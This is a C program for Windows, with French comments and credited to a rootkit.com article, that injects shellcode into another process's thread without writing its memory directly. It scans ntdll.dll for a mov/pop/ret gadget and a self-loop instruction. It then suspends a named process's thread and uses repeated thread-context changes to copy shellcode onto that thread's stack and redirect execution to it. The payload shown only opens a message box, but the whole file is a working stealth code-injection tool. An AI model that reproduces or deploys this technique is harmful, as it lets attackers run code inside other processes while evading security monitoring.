//Source de la technique : http://rootkit.com/newsread.php?newsid=689

#include <windows.h>
#include <stdio.h>
#include <TlHelp32.h>

unsigned char sc[] = { 
	'o' , 'O' , 0x00,
	0x33, 0xC0,						//xor eax,eax
	0xBB, 0x00, 0x00, 0x00, 0x00,	//mov ebx,dword
	0x50,							//push eax
	0x53,							//push ebx
	0x53,							//push ebx
	0x50,							//push eax
	0xB8, 0x00, 0x00, 0x00, 0x00,	//mov eax,dword
	0xFF, 0xD0,						//call eax
	0xC3							//ret
};

BOOL IsAdd( LPBYTE address )
{
	return (*address == 0x83 && (*(address + 1) & 0xF8) == 0xC0 ); 
}

BOOL IsRet( LPBYTE address )
{
    return (*address==0xC3) ||((*address==0xC2)&&(*(address+2)==0x00));
}
BOOL IsPop( LPBYTE address )
{
	return (*address&0xF8)==0x58 && (*address)!=0x5C ;
}
LPBYTE IsAutoLock( LPBYTE address )
{
	if( *address==0xEB && *(address + 1)==0xFE)
		return address;
	return NULL;
}
LPBYTE ValidMov( LPBYTE* address , LPBYTE offset, LPBYTE regs)
{
      
      // PREFIXE OPCODE ModR/M
      
      //Opcode
      
      //E => A ModR/M byte follows the opcode and specifies the operand. The operand is either a
      //general-purpose register or a memory address. If it is a memory address, the address is
      //computed from a segment register and any of the following values: a base register, an
      //index register, a scaling factor, or a displacement.
      //G => The reg field of the ModR/M byte selects a general register (for example, AX (000)).
      //v Word or doubleword, depending on operand-size attribute.
      
      // 0x89 mov Ev,Gv good :) Todo => mov Eb,Gb
      
      if( **address != 0x89 ) 
		  return NULL; 
      
      
      //ModR/M |Mod| Gv| Ev
      //Bit     76  543 210

       //Mod :
      // 00 : [Ev] except if (Dst == 5) => [Dword]
      // 01 : [Ev+byte]
      // 10 : [Ev+dword]
      // 11 : Ev
        
      // 00 && 01 good :)

	  //Eax: 000
	  //Ecx: 001
	  //Edx: 010
	  //Ebx: 011
	  //Esp: 100
	  //Ebp: 101
	  //Esi: 110
	  //Edi: 111

	  bool GoodReg[8] = { false, false, false, true, false, true , true, true };
      
      if( (*(*address + 1) & 0x80) == 0x80 ) return NULL;
      
      if( (*(*address + 1) & 0x40) == 0x40 )
      {
          *offset = *(*address + 2);
		  BYTE Ev = *(*address + 1) >> 3 & 0x07 ;
		  BYTE Gv =	*(*address + 1) & 0x07 ;

		  if(Ev == Gv) return NULL;

		  if( !GoodReg[Ev] || !GoodReg[Gv] ) return NULL;

		  Ev = Ev << 4;

		  *regs = Ev | Gv;

		  *address += 3;
		  
		  return *address - 3;
      }
      else 
      {
           if( (*(*address + 1) & 0x28) == 0x28 ) return NULL; //exception !
		   
		   *offset = 0;
		   BYTE Ev = *(*address + 1) >> 3 & 0x07 ;
		   BYTE Gv =	*(*address + 1) & 0x07 ;

		   if(Ev == Gv) return NULL;

		   if( !GoodReg[Ev] || !GoodReg[Gv] ) return NULL;

		   Ev = Ev << 4;

		   *regs = Ev | Gv;

		   *address += 2;

		   return *address - 2;
      }

      return NULL;
}

void WaitEip(HANDLE hThread, DWORD Eip)
{
	CONTEXT Context;
	Context.ContextFlags = CONTEXT_CONTROL;
	do 
	{
		if(!GetThreadContext(hThread, &Context)) return;
	} 
	while(Context.Eip != Eip);
}
           
int main(int c, char **v)
{
	if( c < 2 ) ExitProcess(0);

	HMODULE NTDLLBase = GetModuleHandle("ntdll.dll");

	LPBYTE start = (LPBYTE)NTDLLBase;

	LPBYTE find;

	DWORD GoodMov = NULL;
	DWORD AutoLock = NULL;
	BYTE OffsetMov;
	BYTE OffsetEsp = 0;
	BYTE Regs;


	while(!GoodMov || !AutoLock)
	{
		
		if(GoodMov == NULL) find = ValidMov(&start,(LPBYTE)&OffsetMov,&Regs);

		if( find != NULL && GoodMov == NULL)
		{	
			OffsetEsp = 0;
			while(1)
			{
				if(IsRet(start)) 
				{
					GoodMov = (DWORD)find;
					break;
				}
				if(IsAdd(start))
				{
					start += 3;
				}
				else if(IsPop(start))
				{
					start += 1;
					OffsetEsp += 4;
				}
				else break;
			}
		}
		if(AutoLock == NULL) AutoLock = (DWORD)IsAutoLock(start);
		start++;
	}
	printf("Mov : 0x%x Opcode: %x\nOffset mov: %x\nOffset esp %d\nRegistre %x\n",GoodMov,*(LPBYTE)GoodMov,OffsetMov,OffsetEsp,Regs);
	printf("Jmp : 0x%x Opcode: %x\n",AutoLock,*(LPBYTE)AutoLock);

	/* Recherche de l'adresse de MessageBoxA sur ce systeme */

	DWORD AddrMsgBox = (DWORD)GetProcAddress(LoadLibrary("user32.dll"),"MessageBoxA");

	printf("Adresse de MessageBoxA: 0x%x\n",AddrMsgBox);

	system("PAUSE");

	(DWORD)*(DWORD *)&sc[15] = AddrMsgBox;

	/* Recherche de l'id du processus cible */

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if(!hSnapshot) ExitProcess(0);

	PROCESSENTRY32 processentry;

	processentry.dwSize = sizeof(PROCESSENTRY32);

	Process32First(hSnapshot,&processentry);

	while(1)
	{
		if(strstr(v[1],processentry.szExeFile)) break;
		if(!Process32Next(hSnapshot,&processentry))
		{
			CloseHandle(hSnapshot);
			ExitProcess(0);
		}
	}

	CloseHandle(hSnapshot);

	/* Recherche un id d'un thread du processus cible */

	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

	if(!hSnapshot) ExitProcess(0);

	THREADENTRY32 threadentry;

	threadentry.dwSize = sizeof(THREADENTRY32);

	Thread32First(hSnapshot, &threadentry);

	while(threadentry.th32OwnerProcessID != processentry.th32ProcessID && Thread32Next(hSnapshot, &threadentry));

	CloseHandle(hSnapshot);

	printf("ID de %s : %d\n",processentry.szExeFile,processentry.th32ProcessID);
	printf("ID de un de ses thread : %d\n",threadentry.th32ThreadID);

	/* Ouverture du thread + detournement */

	HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, 0, threadentry.th32ThreadID);

	if(!hThread) ExitProcess(0);

	if(SuspendThread(hThread) == -1)goto exit;

	CONTEXT Context;
	CONTEXT SafeContext;
	Context.ContextFlags = CONTEXT_FULL;


	if(!GetThreadContext(hThread, &Context))goto exit;

	SafeContext = Context;
	
	LPDWORD PtrToRegContext[9];

	PtrToRegContext[3] = &Context.Ebx;
	PtrToRegContext[5] = &Context.Ebp;
	PtrToRegContext[6] = &Context.Esi;
	PtrToRegContext[7] = &Context.Edi;


	LPDWORD SrcReg = PtrToRegContext[Regs/16];
	LPDWORD DstReg = PtrToRegContext[Regs%16];

	DWORD hAddrBase = Context.Esp - 8 - sizeof(sc);

	(DWORD)*(DWORD *)&sc[6] = hAddrBase + 4;

	*SrcReg = AutoLock;
	*DstReg = hAddrBase - OffsetMov;

	Context.Esp = hAddrBase - OffsetEsp;
	Context.Eip = GoodMov;

	if(!SetThreadContext(hThread,&Context))goto exit;

	if(ResumeThread(hThread) == -1)goto exit;

	WaitEip(hThread, AutoLock);

	int i = 0;
	LPDWORD PtrSc = (LPDWORD)&sc[0];

	while( i <= sizeof(sc) /4 )
	{
		*SrcReg = *(PtrSc + i);
		*DstReg = hAddrBase + 4 + i * 4 - OffsetMov;
		Context.Esp = hAddrBase - OffsetEsp;
		Context.Eip = GoodMov;

		if(!SetThreadContext(hThread,&Context))goto exit;
		if(ResumeThread(hThread) == -1)goto exit;

		WaitEip(hThread, AutoLock);
		i++;
	}

	Context.Eip = hAddrBase + 7;
	Context.Esp = hAddrBase;
	if(!SetThreadContext(hThread,&Context))goto exit;
	if(ResumeThread(hThread) == -1)goto exit;

	WaitEip(hThread, AutoLock);

exit:
	SetThreadContext(hThread,&SafeContext);
	ResumeThread(hThread);

	CloseHandle(hThread);
	ExitProcess(1);

}


      
      
      
      
